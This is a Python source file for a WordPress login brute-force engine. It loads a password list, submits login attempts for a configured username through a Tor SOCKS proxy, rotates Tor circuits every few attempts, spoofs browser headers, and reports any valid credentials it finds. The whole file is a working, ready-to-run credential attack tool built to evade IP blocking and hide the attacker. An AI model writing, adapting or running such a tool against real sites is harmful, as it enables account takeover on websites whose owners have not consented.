"""
WordPress Brute Force Engine

Main brute-force engine that reads configuration, loads password lists,
and performs login attempts through Tor SOCKS proxy with detection capabilities.
"""

import os
import sys
import time
import signal
import logging
import requests
from typing import List, Dict, Optional, Any
from urllib.parse import urljoin, urlparse
import yaml

from .tor_controller import TorController
from .utils import setup_logging, format_output, RetryHandler


class WordPressBruteForcer:
    """
    Main brute-force engine for WordPress login testing via Tor network.
    
    Handles configuration loading, password list management, HTTP requests through
    Tor SOCKS proxy, success/failure detection, and progress tracking.
    """
    
    def __init__(self, config_file: str = "config.yaml"):
        """
        Initialize the brute-force engine with configuration.
        
        Args:
            config_file (str): Path to YAML configuration file
        """
        self.config_file = config_file
        self.config = {}
        self.passwords = []
        self.tor_controller = None
        self.session = None
        self.logger = None
        self.retry_handler = RetryHandler()
        
        # Progress tracking
        self.attempts = 0
        self.start_time = 0
        self.current_password_index = 0
        self.successful_login = False
        self.found_password = None
        
        # Signal handling for clean exit
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
    def load_config(self) -> bool:
        """
        Load configuration from YAML file.
        
        Returns:
            bool: True if configuration loaded successfully
        """
        try:
            with open(self.config_file, 'r') as f:
                self.config = yaml.safe_load(f)
            
            # Validate required configuration fields
            required_fields = ['target_url', 'username', 'password_file']
            for field in required_fields:
                if field not in self.config:
                    raise ValueError(f"Missing required configuration field: {field}")
            
            # Set default values for optional fields
            defaults = {
                'proxy': 'socks5h://127.0.0.1:9050',
                'control_port': 9051,
                'control_password': '',
                'success_indicators': ['/wp-admin/', 'wp-admin-bar'],
                'failure_indicators': ['The password you entered for the username'],
                'attempts_per_circuit': 10,
                'rate_limit': 5,
                'timeout': 30
            }
            
            for key, value in defaults.items():
                if key not in self.config:
                    self.config[key] = value
            
            self.logger.info("Configuration loaded successfully")
            return True
            
        except FileNotFoundError:
            print(f"Error: Configuration file '{self.config_file}' not found")
            return False
        except yaml.YAMLError as e:
            print(f"Error parsing YAML configuration: {e}")
            return False
        except Exception as e:
            print(f"Error loading configuration: {e}")
            return False
    
    def load_passwords(self) -> bool:
        """
        Load password list from file.
        
        Returns:
            bool: True if passwords loaded successfully
        """
        try:
            password_file = self.config['password_file']
            if not os.path.exists(password_file):
                self.logger.error(f"Password file '{password_file}' not found")
                return False
            
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                self.passwords = [line.strip() for line in f if line.strip()]
            
            self.logger.info(f"Loaded {len(self.passwords)} passwords from {password_file}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error loading passwords: {e}")
            return False
    
    def setup_session(self) -> bool:
        """
        Setup HTTP session with Tor SOCKS proxy.
        
        Returns:
            bool: True if session configured successfully
        """
        try:
            self.session = requests.Session()
            
            # Configure proxy settings
            proxy_url = self.config['proxy']
            proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            self.session.proxies.update(proxies)
            
            # Set headers to mimic real browser
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })
            
            # Test connection through proxy
            test_response = self.session.get(
                'http://httpbin.org/ip',
                timeout=self.config['timeout']
            )
            
            if test_response.status_code == 200:
                ip_info = test_response.json()
                self.logger.info(f"Tor connection established. Exit IP: {ip_info.get('origin', 'Unknown')}")
                return True
            else:
                self.logger.error("Failed to establish connection through Tor proxy")
                return False
                
        except Exception as e:
            self.logger.error(f"Error setting up session: {e}")
            return False
    
    def get_login_form(self) -> Optional[Dict[str, str]]:
        """
        Get WordPress login form and extract necessary fields.
        
        Returns:
            Optional[Dict[str, str]]: Form fields if successful, None otherwise
        """
        try:
            response = self.session.get(
                self.config['target_url'],
                timeout=self.config['timeout']
            )
            
            if response.status_code != 200:
                self.logger.warning(f"Unexpected status code: {response.status_code}")
                return None
            
            # Extract form fields (simplified - could be enhanced with BeautifulSoup)
            form_data = {
                'log': self.config['username'],
                'pwd': '',  # Will be filled with password
                'wp-submit': 'Log In',
                'redirect_to': urljoin(self.config['target_url'], '/wp-admin/'),
                'testcookie': '1'
            }
            
            return form_data
            
        except Exception as e:
            self.logger.error(f"Error getting login form: {e}")
            return None
    
    def attempt_login(self, password: str) -> Dict[str, Any]:
        """
        Attempt login with given password.
        
        Args:
            password (str): Password to attempt
            
        Returns:
            Dict[str, Any]: Result containing success status and details
        """
        result = {
            'success': False,
            'password': password,
            'status_code': None,
            'redirect_url': None,
            'response_content': '',
            'error': None
        }
        
        try:
            # Get form data
            form_data = self.get_login_form()
            if not form_data:
                result['error'] = "Failed to get login form"
                return result
            
            # Set password
            form_data['pwd'] = password
            
            # Perform login attempt
            response = self.session.post(
                self.config['target_url'],
                data=form_data,
                timeout=self.config['timeout'],
                allow_redirects=False
            )
            
            result['status_code'] = response.status_code
            result['response_content'] = response.text
            
            # Check for redirect (potential success)
            if response.status_code in [301, 302, 303, 307, 308]:
                redirect_url = response.headers.get('Location', '')
                result['redirect_url'] = redirect_url
                
                # Check success indicators
                for indicator in self.config['success_indicators']:
                    if indicator in redirect_url:
                        result['success'] = True
                        self.logger.info(f"SUCCESS! Found valid password: {password}")
                        break
            
            # Check response content for success indicators
            if not result['success']:
                for indicator in self.config['success_indicators']:
                    if indicator in response.text:
                        result['success'] = True
                        self.logger.info(f"SUCCESS! Found valid password: {password}")
                        break
            
            # Check for failure indicators (if not already successful)
            if not result['success']:
                for indicator in self.config['failure_indicators']:
                    if indicator in response.text:
                        self.logger.debug(f"Login failed for password: {password}")
                        break
            
            return result
            
        except requests.exceptions.Timeout:
            result['error'] = "Request timeout"
            self.logger.warning(f"Timeout attempting password: {password}")
        except requests.exceptions.ConnectionError:
            result['error'] = "Connection error"
            self.logger.warning(f"Connection error attempting password: {password}")
        except Exception as e:
            result['error'] = str(e)
            self.logger.error(f"Error attempting password '{password}': {e}")
        
        return result
    
    def run(self) -> bool:
        """
        Main execution method for brute-force attack.
        
        Returns:
            bool: True if completed successfully, False if error occurred
        """
        # Setup logging
        self.logger = setup_logging()
        
        # Load configuration
        if not self.load_config():
            return False
        
        # Load passwords
        if not self.load_passwords():
            return False
        
        # Initialize Tor controller
        self.tor_controller = TorController(
            control_port=self.config['control_port'],
            control_password=self.config['control_password']
        )
        
        if not self.tor_controller.connect():
            self.logger.error("Failed to connect to Tor")
            return False
        
        # Setup HTTP session
        if not self.setup_session():
            return False
        
        # Start brute-force attack
        self.start_time = time.time()
        self.logger.info("Starting WordPress brute-force attack")
        self.logger.info(f"Target: {self.config['target_url']}")
        self.logger.info(f"Username: {self.config['username']}")
        self.logger.info(f"Passwords to test: {len(self.passwords)}")
        
        try:
            for i, password in enumerate(self.passwords):
                self.current_password_index = i
                self.attempts += 1
                
                # Circuit rotation check
                if (self.attempts % self.config['attempts_per_circuit']) == 0 and self.attempts > 0:
                    self.logger.info("Rotating Tor circuit...")
                    self.tor_controller.new_circuit()
                
                # Attempt login
                self.logger.info(f"Attempt {self.attempts}/{len(self.passwords)}: Testing password '{password}'")
                result = self.attempt_login(password)
                
                if result['success']:
                    self.successful_login = True
                    self.found_password = password
                    break
                
                # Rate limiting
                if self.config['rate_limit'] > 0:
                    time.sleep(self.config['rate_limit'])
            
            # Generate final report
            self._generate_report()
            return True
            
        except KeyboardInterrupt:
            self.logger.info("Attack interrupted by user")
            self._generate_report()
            return False
        except Exception as e:
            self.logger.error(f"Unexpected error during attack: {e}")
            return False
        finally:
            if self.tor_controller:
                self.tor_controller.disconnect()
    
    def _generate_report(self) -> None:
        """Generate final summary report."""
        elapsed_time = time.time() - self.start_time
        
        report = format_output("ATTACK SUMMARY", [
            f"Target URL: {self.config['target_url']}",
            f"Username: {self.config['username']}",
            f"Total attempts: {self.attempts}",
            f"Elapsed time: {elapsed_time:.2f} seconds",
            f"Average time per attempt: {elapsed_time/max(self.attempts, 1):.2f} seconds",
            f"Success: {'Yes' if self.successful_login else 'No'}",
            f"Found password: {self.found_password if self.found_password else 'N/A'}"
        ])
        
        self.logger.info("\n" + report)
        
        if self.successful_login:
            self.logger.info("*** LOGIN SUCCESSFUL ***")
            self.logger.info(f"Valid credentials: {self.config['username']}:{self.found_password}")
    
    def _signal_handler(self, signum, frame):
        """Handle interrupt signals for clean exit."""
        self.logger.info(f"Received signal {signum}, shutting down...")
        self._generate_report()
        if self.tor_controller:
            self.tor_controller.disconnect()
        sys.exit(0)
